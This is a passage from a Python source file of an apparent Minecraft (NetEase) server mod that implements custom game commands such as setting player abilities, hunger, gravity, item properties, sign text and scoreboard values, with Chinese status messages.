		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'setcompasstarget', 'cmdargs': compassdata})
		return False, '将以下玩家的指南针指向 Pos%s:%s' % (str(tuple(compassdata)), create_players_str(cmdargs[0]))

	def setcompassentity(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if len(cmdargs[1]) != 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'setcompassentity', 'cmdargs': cmdargs})
		return False, '将以下玩家的指南针指向 %s:%s' % (CF.CreateEngineType(cmdargs[1][0]).GetEngineTypeStr(), create_players_str(cmdargs[0]))
		
	def setcolor(self, cmdargs, playerId, variant, data):
		if cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[1]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if variant == 3:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setcolortint', 'cmdargs': cmdargs})
			return False, '已设置以下玩家的屏幕色调为 %s(%s,%s,%s):%s' % (cmdargs[2], cmdargs[3], cmdargs[4], cmdargs[5], create_players_str(cmdargs[1]))
		elif variant == 2:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setcolorsaturation', 'cmdargs': cmdargs})
			return False, '已设置以下玩家的屏幕色彩饱和度为 %s:%s' % (cmdargs[2], create_players_str(cmdargs[1]))
		elif variant == 1:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setcolorcontrast', 'cmdargs': cmdargs})
			return False, '已设置以下玩家的屏幕色彩对比度为 %s:%s' % (cmdargs[2], create_players_str(cmdargs[1]))
		else:
			self.NotifyToMultiClients(cmdargs[1], 'CustomCommandClient', {'cmd':'setcolorbrightness', 'cmdargs': cmdargs})
			return False, '已设置以下玩家的屏幕色彩亮度为 %s:%s' % (cmdargs[2], create_players_str(cmdargs[1]))
	
	def setchestitemnum(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if CF.CreateChestBlock(levelId).SetChestBoxItemNum(None, xyz, cmdargs[1], cmdargs[2], cmdargs[3]['id']):
			return False, '已设置槽位 %s 的物品数量为 %s' % (cmdargs[1], cmdargs[2])
		else:
			return True, '位于 Pos%s 的方块不是箱子' % (xyz,)
	
	def setchestitemexchange(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if playerId is None:
			pid = serverApi.GetPlayerList()[random.randint(0, len(serverApi.GetPlayerList())-1)]
		else:
			pid = playerId #尽可能让命令在同维度执行
		if CF.CreateChestBlock(pid).SetChestBoxItemExchange(pid, xyz, cmdargs[1], cmdargs[2]):
			return False, '已交换槽位 %s 与槽位 %s 的物品' % (cmdargs[1], cmdargs[2])
		else:
			return True, '位于 Pos%s 的方块不是箱子' % (xyz,)
	
	def setcanpausescreen(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'setcanpausescreen', 'cmdargs': cmdargs})
		return False, '已将 %s 的暂停权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')

	def setcanotherplayerride(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateRide(i).SetCanOtherPlayerRide(i, cmdargs[1])
		return False, '已%s %s 个实体被骑乘' % ('允许' if cmdargs[1] else '禁止', len(cmdargs[0]))
	
	def setattackplayersability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetAttackPlayersAbility(cmdargs[1])
		return False, '已将 %s 的pvp权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setattackmobsability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetAttackMobsAbility(cmdargs[1])
		return False, '已将 %s 的攻击生物权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')

	def setattackdamage(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			compItem = CF.CreateItem(i)
			itemDict = compItem.GetPlayerItem(2, 0, True)
			if compItem.SetAttackDamage(itemDict, cmdargs[1]):
				compItem.SpawnItemToPlayerCarried(itemDict, i)
		return False, '已将 %s 的手持物品攻击伤害设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def setspawnpoint(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[0][0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[0] == "null(can't replace to null, will be a bug)":
			cmdargs[0] = playerId, #','用来创建tuple
		if cmdargs[1] is None:
			cmdargs[1] = data['origin']['blockPos']
		x, y, z = cmdargs[1]
		if cmdargs[2] is None:
			cmdargs[2] = {'name': data['origin']['dimension'], 'id': data['origin']['dimension']}
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerRespawnPos((intg(x), int(y), intg(z)), cmdargs[2]['id'])
		return False, '将 %s 的重生点设置为 %s in %s' % (create_players_str(cmdargs[0]), cmdargs[1], cmdargs[2]['name'])
	
	def setplayerhealthlevel(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[1] < 0 :#or cmdargs[1] > 20:
			return True, '无效的回血临界值 (%s < 0)' % cmdargs[1]
		elif cmdargs[1] > 20:
			return True, '无效的回血临界值 (%s > 20)' % cmdargs[1]
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerHealthLevel(cmdargs[1])
		return False, '将 %s 的回血临界值设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setplayerstarvelevel(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[1] < 0:
			return True, '无效的扣血临界值 (%s < 0)' % cmdargs[1]
		elif cmdargs[1] > 20:
			return True, '无效的扣血临界值 (%s > 20)' % cmdargs[1]
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerStarveLevel(cmdargs[1])
		return False, '将 %s 的扣血临界值设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setplayerhunger(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[1] < 0 :
			return True, '无效的饥饿度 (%s < 0)' % cmdargs[1]
		elif cmdargs[1] > 20:
			return True, '无效的饥饿度 (%s > 20)' % cmdargs[1]
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerHunger(cmdargs[1])
		return False, '将 %s 的饥饿度设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setplayerattackspeedamplifier(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		if cmdargs[1] < 0.5:
			return True, '无效的倍率 (%s < 0.5)' % cmdargs[1]
		elif cmdargs[1] > 2.0:
			return True, '无效的倍率 (%s > 2.0)' % cmdargs[1]
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerAttackSpeedAmplifier(cmdargs[1])
		return False, '将 %s 的攻击速度倍率设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setplayerjumpable(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerJumpable(cmdargs[1])
		return False, '将 %s 的跳跃权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setplayermovable(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerMovable(cmdargs[1])
		return False, '将 %s 个玩家的移动权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setplayernaturalstarve(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerNaturalStarve(cmdargs[1])
		return False, '将 %s 的饥饿掉血设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setplayerprefixandsuffixname(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateName(i).SetPlayerPrefixAndSuffixName(cmdargs[1], '§f', cmdargs[2], '§f')
		return False, '将 %s 的前缀设置为 %s, 后缀设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1], cmdargs[2])
	
	def setplayermaxexhaustionvalue(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerMaxExhaustionValue(cmdargs[1])
		return False, '将 %s 的饥饿最大消耗度设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setplayerhealthtick(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerHealthTick(cmdargs[1])
		return False, '将 %s 的自然回血速度设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def setplayerstarvetick(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerStarveTick(cmdargs[1])
		return False, '将 %s 的自然扣血速度设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def sethurtcd(self, cmdargs, playerId, variant, data):
		if compGame.SetHurtCD(cmdargs[0]):
			return False, '将全局受击间隔设置为 %s' % (cmdargs[0])
		else:
			return True, '设置失败'
	
	def setattacktarget(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		if len(cmdargs[1]) != 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		attackTargetId = cmdargs[1][0]
		for i in cmdargs[0]:
			CF.CreateAction(i).SetAttackTarget(attackTargetId)
		return False, '将 %s 个实体的仇恨目标设置为 %s' % (len(cmdargs[0]), CF.CreateEngineType(attackTargetId).GetEngineTypeStr())
	
	def resetattacktarget(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateAction(i).ResetAttackTarget()
		return False, '成功重置 %s 个实体的仇恨目标' % (len(cmdargs[0]))
	
	def setbanplayerfishing(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetBanPlayerFishing(cmdargs[1])
		return False, '将 %s 的钓鱼权限设置为 %s' % (create_players_str(cmdargs[0]), '禁止' if cmdargs[1] else '允许')
	
	def setactorcanpush(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateActorPushable(i).SetActorPushable(cmdargs[1])
		return False, '已%s %s个 实体被推动' % ('允许' if cmdargs[1] else '禁止', len(cmdargs[0]))
	
	def	setactorcollidable(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateActorCollidable(i).SetActorCollidable(cmdargs[1])
		return False, '已%s %s 实体拥有固体碰撞箱' % ('允许' if cmdargs[1] else '禁止', len(cmdargs[0]))
	
	def setmineability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetMineAbility(cmdargs[1])
		return False, '将 %s 的挖掘权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setbuildability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetBuildAbility(cmdargs[1])
		return False, '将 %s 的放置权限设置为 %s' % (create_players_str(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setcontrol(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateRide(i).SetControl(i, cmdargs[1])
		return False, '已设置 %s 个实体的控制权' % (len(cmdargs[0]))
	
	def setpickuparea(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPickUpArea(cmdargs[1])
		return False, '已将 %s 的拾取范围设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setlevelgravity(self, cmdargs, playerId, variant, data):
		compGame.SetLevelGravity(cmdargs[0])
		return False , '已将世界重力设置为 %s' % (cmdargs[0])
	
	def setjumppower(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateGravity(i).SetJumpPower(cmdargs[1])
		return False, '已设置 %s 个实体的跳跃力度为 %s' % (len(cmdargs[0]), cmdargs[1])
	
	def setgravity(self, cmdargs, playerId, variant, data):
		for i in cmdargs[0]:
			CF.CreateGravity(i).SetGravity(cmdargs[1])
		return False, '已设置 %s 个实体的重力为 %s' % (len(cmdargs[0]), cmdargs[1])
	
	def setworldspawnd(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[1]
		xyz = (intg(x), int(y), intg(z))
		compGame.SetSpawnDimensionAndPosition(cmdargs[0]['id'], xyz)
		return False, '已设置世界出生点为 %s in %s' % (xyz, cmdargs[0]['name'])
		
	def playeruseitemtopos(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[2] not in [0, 1, 2, 3, 4, 5]:
			return True, '无效的朝向'
		x, y, z = cmdargs[1]
		xyz = (intg(x), int(y), intg(z))
		for i in cmdargs[0]:
			CF.CreateBlockInfo(i).PlayerUseItemToPos(xyz, 2, 0, cmdargs[2])
		return False, '已尝试让 %s 向 %s 的 %s 面使用物品' % (create_players_str(cmdargs[0]), xyz, ['上', '下', '北', '南', '西', '东'][cmdargs[2]])
	
	def playeruseitemtoentity(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None or cmdargs[1] is None:
			return True, '没有与选择器匹配的目标'
		if len(cmdargs[1]) != 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		entityId = cmdargs[1][0]
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateBlockInfo(i).PlayerUseItemToEntity(entityId)
		return False, '已尝试让 %s 向 %s 使用物品' % (create_players_str(cmdargs[0]), CF.CreateEngineType(entityId).GetEngineTypeStr())
	
	def playerdestoryblock(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		x, y, z = cmdargs[1]
		xyz = (intg(x), int(y), intg(z))
		for i in cmdargs[0]:
			CF.CreateBlockInfo(i).PlayerDestoryBlock(xyz, cmdargs[2], cmdargs[3])
		return False, '已尝试让 %s 破坏 Pos%s 处的方块' % (create_players_str(cmdargs[0]), xyz)
	
	def openworkbench(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateBlockInfo(i).OpenWorkBench()
		return False, '已使 %s 打开工作台界面' % (create_players_str(cmdargs[0]))
	
	def openfoldgui(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'openfoldgui', 'cmdargs': cmdargs})
		return False, '已使 %s 打开下拉界面' % (create_players_str(cmdargs[0]))
	
	def setimmunedamage(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateHurt(i).ImmuneDamage(cmdargs[1])
		return False, '将 %s 个实体的伤害免疫设置为 %s' % (len(cmdargs[0]), '允许' if cmdargs[1] else '禁止')
	
	def setinvitemexchange(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateItem(i).SetInvItemExchange(cmdargs[1], cmdargs[2])
		return False, '已交换 %s 物品栏槽位 %s 与槽位 %s 中的物品' % (create_players_str(cmdargs[0]), cmdargs[1], cmdargs[2])
	
	def setinvitemnum(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[2] < 0 or cmdargs[2] > 64:
			return True, '无效的物品数量'
		for i in cmdargs[0]:
			CF.CreateItem(i).SetInvItemNum(cmdargs[1], cmdargs[2])
		return False, '已将 %s 物品栏槽位 %s 中的物品数量设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1], cmdargs[2])
	
	def setitemdurability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[1] < 0 or cmdargs[1] > 32766:
			return True, '无效的耐久度'
		for i in cmdargs[0]:
			CF.CreateItem(i).SetItemDurability(2, 0, cmdargs[1])
		return False, '已设置 %s 的手持物品物品耐久度为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
			
	def setitemmaxdurability(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[1] < 0 or cmdargs[1] > 32766:
			return True, '无效的耐久度'
		for i in cmdargs[0]:
			CF.CreateItem(i).SetItemMaxDurability(2, 0, cmdargs[1], True)
		return False, '已设置 %s 的手持物品最大耐久度为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
		
	def setitemtierlevel(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[1] not in [0, 1, 2, 3, 4]:
			return True, '无效的挖掘等级'
		for i in cmdargs[0]:
			itemdata = CF.CreateItem(i).GetPlayerItem(2, 0, True)
			CF.CreateItem(i).SetItemTierLevel(itemdata, cmdargs[1])
			CF.CreateItem(i).SpawnItemToPlayerCarried(itemdata, i)
		return False, '已设置 %s 的手持物品挖掘等级为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setitemtierspeed(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[1] < 0:
			return True, '无效的挖掘速度'
		for i in cmdargs[0]:
			itemdata = CF.CreateItem(i).GetPlayerItem(2, 0, True)
			CF.CreateItem(i).SetItemTierSpeed(itemdata, cmdargs[1])
			CF.CreateItem(i).SpawnItemToPlayerCarried(itemdata, i)
		return False, '已设置 %s 的手持物品挖掘速度为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def setitemmaxstacksize(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		if cmdargs[1] < 1:
			return True, '无效的堆叠数量 (%s < 1)' % (cmdargs[1])
		elif cmdargs[1] > 64:
			return True, '无效的堆叠数量 (%s > 64)' % (cmdargs[1])
		for i in cmdargs[0]:
			itemDict = CF.CreateItem(i).GetPlayerItem(2, 0, True)
			CF.CreateItem(i).SetMaxStackSize(itemDict, cmdargs[1])
			CF.CreateItem(i).SpawnItemToPlayerCarried(itemDict, i)
		return False, '已设置 %s 的手持物品最大堆叠数量为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def playerexhaustionratio(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'	
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		exhaustion = {'heal': 0, 'jump':1, 'sprint_jump':2, 'mine':3, 'attack':4, 'global':9}
		exhaustiontype = exhaustion[cmdargs[1]]
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerExhaustionRatioByType(exhaustiontype, cmdargs[2])
		return False, '已设置 %s 的 %s 行为饥饿度消耗倍率为 %s' % (create_players_str(cmdargs[0]), cmdargs[1], cmdargs[2])
	
	def setsigntextstyle(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		rgba = (cmdargs[2], cmdargs[3], cmdargs[4], cmdargs[5])
		lighting = cmdargs[6]
		if compBlockEntity.SetSignTextStyle(xyz, cmdargs[1]['id'], rgba, lighting, int(cmdargs[7])):
			return False, '将 Pos%s in %s 的告示牌 %s 文本样式设置为 %s' % (xyz, cmdargs[1]['name'], '反面' if cmdargs[7] else '正面', rgba)
		else:
			return True, '位于 Pos%s in %s 的方块不是告示牌' % (xyz, cmdargs[1]['name'])
		
	def setsigntext(self, cmdargs, playerId, variant, data):
		x, y, z = cmdargs[0]
		xyz = (intg(x), int(y), intg(z))
		if CF.CreateBlockInfo(levelId).SetSignBlockText(xyz, cmdargs[1], cmdargs[2]['id'], int(cmdargs[3])):
			return False, '将 Pos%s in %s 的告示牌 %s 文本设置为 %s' % (xyz, cmdargs[2]['name'], '反面' if cmdargs[3] else '正面', cmdargs[1])
		else:
			return True, '位于 Pos%s in %s 的方块不是告示牌' % (xyz, cmdargs[2]['name'])

	def setplayerinteracterange(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型' 
		for i in cmdargs[0]:
			CF.CreatePlayer(i).SetPlayerInteracteRange(cmdargs[1])
		self.NotifyToMultiClients(cmdargs[0], 'CustomCommandClient', {'cmd':'setplayerinteracterange', 'cmdargs': cmdargs})
		return False, '已设置 %s 的触及距离为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])
	
	def summonprojectile(self, cmdargs, playerId, variant, data):
		try:
			targetlen = len(cmdargs[7])
			target = cmdargs[7][0]
		except:
			targetlen = 1
			target = None
		if not targetlen == 1:
			return True, '只允许一个实体, 但提供的选择器允许多个实体'
		
		for i in cmdargs[0]:
			param = {
				'position': cmdargs[2],
				'direction': cmdargs[3],
				'power': cmdargs[4],
				'gravity': cmdargs[5],
				'damage': cmdargs[6],
				'targetId': target,
				'isDamageOwner': cmdargs[8],
				'auxValue': cmdargs[9]
			}
			
			CF.CreateProjectile(levelId).CreateProjectileEntity(i, cmdargs[1], param)
		return False, '成功生成抛射物'
	
	def setstepheight(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateAttr(i).SetStepHeight(cmdargs[1])
		return False, '将 %s 能迈过的最大高度设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def setsize(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			CF.CreateCollisionBox(i).SetSize((cmdargs[1], cmdargs[2]))
		return False, '已设置 %s 个实体的碰撞箱为 (%s, %s)' % (len(cmdargs[0]), cmdargs[1], cmdargs[2])
		
	def playerchatprefix(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		for i in cmdargs[0]:
			if CF.CreateEngineType(i).GetEngineTypeStr() != 'minecraft:player':
				return True, '选择器必须为玩家类型'
		for i in cmdargs[0]:
			CF.CreateExtraData(i).SetExtraData('chatprefix', cmdargs[1])
		return False, '将 %s 的聊天前缀设置为 %s' % (create_players_str(cmdargs[0]), cmdargs[1])

	def writehealthtoscoreboard(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
			return True, '没有与选择器匹配的目标'
		objects = compGame.GetAllScoreboardObjects()
		scoreboard_name = cmdargs[1]
		if not any(obj['name'] == scoreboard_name for obj in objects):
			return True, '未找到该计分板对象'
		for entity in cmdargs[0]:
			health = CF.CreateAttr(entity).GetAttrValue(0)
			health = int(round(health))
			compCmd.SetCommand('/scoreboard players set @s %s %s' % (scoreboard_name, health), entity, False)
		return False, '已将 %s 个实体的生命值写入计分板 %s' % (len(cmdargs[0]), scoreboard_name)
		
	def writehungertoscoreboard(self, cmdargs, playerId, variant, data):
		if cmdargs[0] is None:
